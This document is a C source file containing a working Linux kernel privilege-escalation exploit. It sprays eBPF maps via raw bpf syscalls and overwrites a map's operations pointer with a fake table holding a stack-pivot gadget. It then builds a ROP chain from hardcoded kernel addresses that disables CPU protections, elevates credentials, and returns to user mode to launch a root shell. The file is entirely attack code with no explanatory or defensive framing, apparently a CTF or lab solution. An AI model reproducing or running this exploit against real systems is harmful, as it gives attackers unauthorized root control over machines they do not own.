#define _GNU_SOURCE
#include <err.h>
#include <inttypes.h>
#include <sched.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <time.h>
#define SPRAY_NUMBER 14
#ifndef __NR_bpf
#define __NR_bpf 321
#endif

void errExit(char *err_msg)
{
    puts(err_msg);
    exit(-1);
}

size_t user_cs, user_ss, user_sp, user_rflags;
void save_status()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    puts("[*]status has been saved.");
}

void get_shell()
{
    if (getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

int main()
{
    signal(SIGSEGV, get_shell);
    save_status();
    unsigned long swapgs = 0xffffffff81c00d5a;
    unsigned long iretq = 0xffffffff8106d8f4;
    unsigned long stack_pivot_gadget = 0xffffffff81954dc8;
    char *buf = malloc(0x4000);
    long int res;
    unsigned long fake_ops[0x1000] = {0};
    unsigned long pointer[0x1000] = {0};
    char *rop_addr;

    memset(buf, 0, sizeof(buf));
    *(unsigned int *)buf = 0x17;
    *(unsigned int *)(buf + 4) = 0;
    *(unsigned int *)(buf + 8) = 0x40;
    *(unsigned int *)(buf + 12) = -1;
    *(unsigned int *)(buf + 16) = 0;
    *(unsigned int *)(buf + 20) = -1;
    res = syscall(__NR_bpf, 0, buf, 0x2c);
    if (res == -1)
        errExit("BPF_MAP_CREATE error!");

    unsigned long victim[SPRAY_NUMBER];
    for (int i = 0; i < SPRAY_NUMBER; i++)
    {
        victim[i] = syscall(__NR_bpf, 0, buf, 0x2c);
    }
    printf("spray finished!\n");

    fake_ops[2] = stack_pivot_gadget;
    pointer[6] = fake_ops;
    *(unsigned int *)buf = res;
    *(unsigned int *)(buf + 4) = 0;
    *(unsigned long *)(buf + 8) = 0;
    *(unsigned long *)(buf + 16) = pointer;
    *(unsigned long *)(buf + 24) = 2;
    syscall(__NR_bpf, 2, buf, 0x20);
    printf("changed ops\n");
    rop_addr = mmap(0x81954000, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    int idx = 0;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81029c71;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0x6f0;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff810013b9;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xFFFFFFFF810E3D40;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81001c50;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff810013b9;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81264e0b;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xFFFFFFFF810E3AB0;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81c00d5a;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0x246;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff8106d8f4;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)get_shell;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_cs;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_rflags;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_sp;
    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_ss;
    *(unsigned long *)(0x81954dc8) = 0xffffffff81029c71;

    for (int i = 0; i < SPRAY_NUMBER; i++)
    {
        close(victim[i]);
    }

    return 0;
}